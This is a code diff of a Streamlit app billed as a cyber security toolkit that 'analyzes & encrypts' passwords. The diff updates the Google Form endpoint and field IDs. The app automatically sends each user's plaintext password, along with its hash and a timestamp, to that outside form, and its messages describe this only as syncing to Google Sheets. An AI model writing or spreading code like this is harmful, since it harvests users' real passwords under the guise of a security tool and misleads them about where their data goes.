@@ -7,27 +7,30 @@ from datetime import datetime
 st.set_page_config(page_title="CyberToolkit Pro", page_icon="🛡️")
 
 st.title("🛡️ Global Cyber Security Toolkit")
-st.markdown("### SaaS Project v1.5 | Developed by Ali Al-Murtadha")
+st.markdown("### SaaS Project v1.6 | Developed by Ali Al-Murtadha")
 
-# دالة إرسال البيانات إلى Google Form (بديلة للجداول المباشرة)
+# دالة إرسال البيانات إلى Google Form الجديد
 def send_to_google_form(t, o, h):
-    # الرابط الذي أرسلته لي تم تحويله لرابط إرسال برمجي
-    url = "https://docs.google.com/forms/d/e/1FAIpQLSeL4BcwKAp8zK92-OQSadFq_8wJx4sjxcsk6mVFjAOF0guO1w/formResponse"
+    # الرابط البرمجي للنموذج الجديد
+    url = "https://docs.google.com/forms/d/e/1FAIpQLSer6YvXnFLDTFRMYLrRBKNvcsn454gO7Dn4MKpYqa9oy8JDvg/formResponse"
     
-    # معرفات الخانات المستخرجة من رابطك
+    # المفاتيح السرية المستخرجة من رابطك الجديد
     payload = {
-        "entry.796268616": t,  # خانة الوقت
-        "entry.560405070": o,  # خانة النص الأصلي
-        "entry.1206586590": h  # خانة التشفير
+        "entry.942326564": t,  # خانة time
+        "entry.439094694": o,  # خانة original_text
+        "entry.106205918": h   # خانة hashed_value
     }
     
     try:
-        requests.post(url, data=payload)
-        return True
+        response = requests.post(url, data=payload)
+        if response.status_code == 200:
+            return True
+        else:
+            return False
     except:
         return False
 
-# خانة الإدخال
+# واجهة المستخدم
 password = st.text_input("Enter password to analyze & encrypt:", type="password")
 
 if password:
@@ -37,21 +40,21 @@ if password:
     st.success("✅ Encryption Complete")
     st.code(hashed_password)
     
-    # 2. إرسال البيانات تلقائياً
+    # 2. إرسال البيانات تلقائياً للجدول السحابي
     current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
     if send_to_google_form(current_time, password, hashed_password):
-        st.info("📊 Activity logged to Cloud Database (via Form Bridge)")
+        st.info("📊 Data successfully synced to Google Sheets!")
     else:
-        st.warning("⚠️ Logging is active, check connection.")
+        st.warning("⚠️ Connection issue, data not synced.")
 
-# سجل النشاط المحلي
+# سجل الجلسة الحالي
 if 'history' not in st.session_state:
     st.session_state.history = []
 
 if password and (not st.session_state.history or password != st.session_state.history[-1]):
     st.session_state.history.append(password)
 
-with st.expander("View Recent Session"):
+with st.expander("Session History"):
     for item in st.session_state.history[-5:]:
         st.text(f"Processed: {item[:3]}***")
